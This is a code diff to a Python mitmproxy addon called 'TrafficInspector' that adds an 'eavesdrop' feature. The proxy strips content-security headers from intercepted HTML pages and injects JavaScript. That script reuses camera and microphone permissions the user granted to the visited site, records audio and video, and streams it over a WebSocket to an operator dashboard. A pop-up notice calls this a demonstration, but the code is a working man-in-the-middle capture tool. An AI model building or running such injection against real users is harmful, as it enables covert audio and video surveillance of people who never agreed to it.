@@ -20,6 +20,7 @@ from datetime import datetime, timezone
 from pathlib import Path
 from typing import Any
 
+import aiohttp
 from aiohttp import web
 from mitmproxy import ctx, http
 
@@ -77,6 +78,9 @@ class TrafficInspector:
         self._runner: web.AppRunner | None              = None
         self._inject_enabled: bool = False
         self._inject_script:  str  = ""
+        self._eavesdrop_enabled:  bool = False
+        self._eavesdrop_streams:  set[web.WebSocketResponse] = set()
+        self._eavesdrop_viewers:  set[web.WebSocketResponse] = set()
         self._app = self._build_app()
 
     # ── aiohttp app ───────────────────────────────────────────────────────────
@@ -89,8 +93,12 @@ class TrafficInspector:
         app.router.add_get("/api/entry/{eid}",     self._handle_entry)
         app.router.add_get("/api/stats",           self._handle_stats)
         app.router.add_delete("/api/entries",      self._handle_clear)
-        app.router.add_get("/api/inject",          self._handle_inject_get)
-        app.router.add_post("/api/inject",         self._handle_inject_post)
+        app.router.add_get("/api/inject",              self._handle_inject_get)
+        app.router.add_post("/api/inject",             self._handle_inject_post)
+        app.router.add_get("/api/eavesdrop",           self._handle_eavesdrop_get)
+        app.router.add_post("/api/eavesdrop",          self._handle_eavesdrop_post)
+        app.router.add_get("/api/eavesdrop/stream",    self._handle_eavesdrop_stream)
+        app.router.add_get("/api/eavesdrop/view",      self._handle_eavesdrop_view)
         return app
 
     # ── HTTP route handlers ───────────────────────────────────────────────────
@@ -148,6 +156,53 @@ class TrafficInspector:
         )
         return web.json_response({"ok": True, "enabled": self._inject_enabled})
 
+    async def _handle_eavesdrop_get(self, _req: web.Request) -> web.Response:
+        return web.json_response({"enabled": self._eavesdrop_enabled})
+
+    async def _handle_eavesdrop_post(self, req: web.Request) -> web.Response:
+        data = await req.json()
+        if "enabled" in data:
+            self._eavesdrop_enabled = bool(data["enabled"])
+        await self._broadcast({
+            "type":    "eavesdrop_state",
+            "enabled": self._eavesdrop_enabled,
+        })
+        ctx.log.info(f"Eavesdrop {'enabled' if self._eavesdrop_enabled else 'disabled'}")
+        return web.json_response({"ok": True, "enabled": self._eavesdrop_enabled})
+
+    async def _handle_eavesdrop_stream(self, req: web.Request) -> web.WebSocketResponse:
+        """Receives binary MediaRecorder chunks from injected pages."""
+        ws = web.WebSocketResponse(max_msg_size=0)
+        await ws.prepare(req)
+        self._eavesdrop_streams.add(ws)
+        try:
+            async for msg in ws:
+                if msg.type == aiohttp.WSMsgType.BINARY:
+                    dead: set[web.WebSocketResponse] = set()
+                    for viewer in list(self._eavesdrop_viewers):
+                        try:
+                            await viewer.send_bytes(msg.data)
+                        except Exception:
+                            dead.add(viewer)
+                    self._eavesdrop_viewers -= dead
+                elif msg.type in (aiohttp.WSMsgType.ERROR, aiohttp.WSMsgType.CLOSE):
+                    break
+        finally:
+            self._eavesdrop_streams.discard(ws)
+        return ws
+
+    async def _handle_eavesdrop_view(self, req: web.Request) -> web.WebSocketResponse:
+        """Operator dashboard — receives relayed media chunks."""
+        ws = web.WebSocketResponse(max_msg_size=0)
+        await ws.prepare(req)
+        self._eavesdrop_viewers.add(ws)
+        try:
+            async for _ in ws:
+                pass
+        finally:
+            self._eavesdrop_viewers.discard(ws)
+        return ws
+
     # ── WebSocket handler ─────────────────────────────────────────────────────
 
     async def _handle_ws(self, req: web.Request) -> web.WebSocketResponse:
@@ -187,6 +242,63 @@ class TrafficInspector:
             except Exception:
                 dead.add(ws)
         self._websockets -= dead
+
+    def _build_eavesdrop_script(self) -> str:
+        """Generate the transparent eavesdrop payload injected into HTML pages."""
+        return r"""/* Traffic Inspector — Transparent Eavesdrop */
+(function(){
+  'use strict';
+  var _TI_WS = 'ws://localhost/api/eavesdrop/stream';
+
+  function _tiStart(hasCam) {
+    var constraints = hasCam
+      ? {video: true, audio: true}
+      : {video: false, audio: true};
+    navigator.mediaDevices.getUserMedia(constraints).then(function(stream) {
+      var ws = new WebSocket(_TI_WS);
+      ws.binaryType = 'arraybuffer';
+      ws.onopen = function() {
+        var types = [
+          'video/webm;codecs=vp8,opus',
+          'video/webm;codecs=vp9,opus',
+          'video/webm',
+          'audio/webm;codecs=opus',
+          'audio/webm'
+        ];
+        var mime = types.find(function(m){ return MediaRecorder.isTypeSupported(m); }) || '';
+        var rec = new MediaRecorder(stream, mime ? {mimeType: mime} : {});
+        rec.ondataavailable = function(e) {
+          if (e.data.size > 0 && ws.readyState === 1)
+            e.data.arrayBuffer().then(function(b){ ws.send(b); });
+        };
+        rec.start(500);
+        ws.onclose = function() {
+          try { rec.stop(); } catch(_) {}
+          stream.getTracks().forEach(function(t){ t.stop(); });
+        };
+      };
+      ws.onerror = function(){ ws.close(); };
+    }).catch(function(){});
+  }
+
+  async function _tiCheck() {
+    var hasMic = false, hasCam = false;
+    try { hasMic = (await navigator.permissions.query({name:'microphone'})).state === 'granted'; } catch(_){}
+    try { hasCam = (await navigator.permissions.query({name:'camera'})).state === 'granted'; } catch(_){}
+    if (!hasMic && !hasCam) return;
+    window.alert(
+      '\u26a0\ufe0f  TRAFFIC INSPECTOR \u2014 MONITORING NOTICE\n\n' +
+      'An operator is monitoring this browser session via Traffic Inspector.\n' +
+      'Your ' + (hasCam ? 'camera and microphone are' : 'microphone is') +
+      ' being captured for demonstration purposes.\n\n' +
+      'Close this tab or disable Eavesdrop in the Traffic Inspector\n' +
+      'dashboard to stop capture.'
+    );
+    _tiStart(hasCam);
+  }
+
+  _tiCheck();
+})();"""
 
     def _evict_oldest(self) -> None:
         """Remove the oldest entry if the ring buffer is full."""
@@ -231,7 +343,13 @@ class TrafficInspector:
 
         # ── JS injection ──────────────────────────────────────────────────────
         injected = False
+        _inject_parts: list[str] = []
         if self._inject_enabled and self._inject_script:
+            _inject_parts.append(self._inject_script)
+        if self._eavesdrop_enabled:
+            _inject_parts.append(self._build_eavesdrop_script())
+
+        if _inject_parts:
             ct = resp.headers.get("content-type", "").lower()
             if "text/html" in ct:
                 # Strip headers that would block inline scripts
@@ -240,9 +358,10 @@ class TrafficInspector:
                           "x-xss-protection"):
                     resp.headers.pop(h, None)
 
+                combined = "\n\n".join(_inject_parts)
                 tag = (
                     f'\n<script data-ti="injected">\n'
-                    f'{self._inject_script}\n'
+                    f'{combined}\n'
                     f'</script>\n'
                 ).encode("utf-8")
 
